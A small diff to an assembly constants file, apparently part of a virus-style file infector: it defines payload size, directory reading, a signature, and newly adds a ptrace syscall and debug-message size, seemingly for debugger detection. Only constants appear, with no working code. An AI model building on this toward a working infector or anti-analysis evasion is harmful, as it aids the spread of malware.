@@ -12,6 +12,7 @@
 %assign SYSCALL_FTRUNCATE	77
 %assign SYSCALL_GETDENTS	78
 %assign SYSCALL_CHMOD		90
+%assign SYSCALL_PTRACE		101
 
 ; Constant values
 %define PAYLOAD_SIZE		(_end - _start)
@@ -19,6 +20,7 @@
 %assign	DIRENT_ARR_SIZE		1024
 %assign	PATH_MAX			4096
 %assign SIGNATURE_SIZE		35
+%assign DEBUG_MESSAGE_SIZE	9
 
 ; File access options
 %assign	O_RDONLY			0o0000000
